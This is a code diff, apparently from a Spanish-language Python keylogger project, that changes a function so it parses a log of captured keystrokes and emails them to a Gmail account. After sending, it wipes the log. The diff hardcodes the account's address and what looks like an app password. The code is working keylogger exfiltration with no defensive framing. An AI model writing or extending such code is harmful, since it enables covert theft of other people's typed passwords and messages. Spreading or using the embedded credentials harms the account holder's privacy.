@@ -21,23 +21,35 @@ def Enviar():
     try:
         with open(destino, 'r+') as f:
             fecha = datetime.datetime.now().strftime('%Y-%m-%d %H:%M:%S')
-            data = f.read()
-            data = data.replace('Space', ' ')
-            data = data.replace('\n', '')
-            mensaje = f'Mensaje capturado a las: {fecha}\n{data}'
+            data = f.readlines()  # Lee todas las líneas como una lista
+            teclas = []
+            # Procesa cada línea para extraer solo la información relevante
+            for linea in data:
+                if "Tecla presionada" in linea:
+                    tecla = linea.split("Tecla presionada: ")[-1].strip()
+                    teclas.append(tecla)
+                elif "Tecla especial presionada" in linea:
+                    tecla = linea.split("Tecla especial presionada: ")[-1].strip()
+                    teclas.append(tecla)
+
+            # Convierte la lista en un string para enviarla como correo
+            mensaje = f'Mensaje capturado a las: {fecha}\nTeclas registradas:\n{", ".join(teclas)}'
             print(mensaje)
-            # Reemplazar con tus credenciales y destinatarios
+            
+            # Llama a la función para enviar el correo
             crearEmail(
                 user="yonkia9@gmail.com",
-                passw="yonselacome",
+                passw="nntl nsht luzg vzdl",
                 recep=["yonkia9@gmail.com"],
                 subj="Registro de teclas",
                 body=mensaje,
             )
+            # Limpia el archivo después de enviar el correo
             f.seek(0)
             f.truncate()
     except Exception as e:
         print(f"Error al enviar el archivo: {e}")
+
 
 # Función para configurar y enviar el correo
 def crearEmail(user, passw, recep, subj, body):
